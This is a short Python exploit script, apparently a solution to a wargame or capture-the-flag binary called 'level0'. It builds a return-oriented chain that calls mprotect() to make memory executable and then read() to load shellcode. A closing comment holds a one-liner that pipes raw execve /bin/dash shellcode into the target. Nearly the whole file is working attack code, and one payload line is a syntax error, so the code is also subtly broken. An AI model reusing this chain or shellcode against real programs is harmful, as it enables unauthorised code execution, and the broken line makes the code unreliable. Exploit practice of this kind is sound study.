import struct


def p(x):
    return struct.pack('<L', x)


mprotect = 0x80523e0	# This function allows to RWX stacks of memory
pop3ret = 0x8048882		# These gadgets clear arguments
read = 0x80517f0		# This function allows to execute shellcode


# empty payload
payload = ""

#padding
payload += print "A" * 44

#mark target memory stack as rwx
payload += p(mprotect)          # EIP to mprotect()
payload += p(pop3ret)
payload += p(0x080ca000)        # ARGV 1 = address of beginning of rwx stack.
payload += p(0x1000)            # ARGV 2 = size
payload += p(0x7)               # ARGV 3 = mprotect() permissions;
                                # PROT_READ, PROT_WRITE, PROT_EXEC


# execute shellcode using read() with ARGV STDIN.
payload += p(read)              # EIP to read()
payload += p(0x080ca000)        # ARGV 1 	= address of rwx stack.
payload += p(0x0)               # fd 		= STDIN
payload += p(0x080ca000)        # ARGV 2 	= STDIN(shellcode) into rwx stack.
payload += p(0x100)             # ARGV 3	= nbyte; how many bytes to read.
 
print payload



# Not all local /bin/shl shellcodes work, & use execve.
# (python ./x.py; python -c 'print "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"';cat) | ./level0
